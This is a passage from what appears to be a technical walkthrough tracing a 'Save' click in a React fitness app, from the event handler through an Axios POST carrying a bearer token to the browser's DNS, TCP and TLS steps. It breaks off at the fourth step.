    User Interaction — React Event User clicks the "Save" button. React's synthetic event system fires the onClick handler. The handler calls handleSubmit(), sets setLoading(true), and calls workoutService.create(formData).
  2. 2
    Service Layer — Axios Request Construction workoutService.create() calls api.post('/workouts', formData). Axios constructs an HTTP request object with method POST, URL, and JSON-serialized body. The request interceptor runs — reads localStorage.getItem('fitoglobe_token') and adds Authorization: Bearer eyJ... to headers.
  3. 3
    Browser Network Layer — DNS + TCP + TLS In production: browser resolves fitoglobe-api.railway.app via DNS (likely cached). Establishes TCP connection (3-way handshake, already warm via HTTP/2 keep-alive). Sends encrypted HTTP/2 frames containing the request.
  4. 4
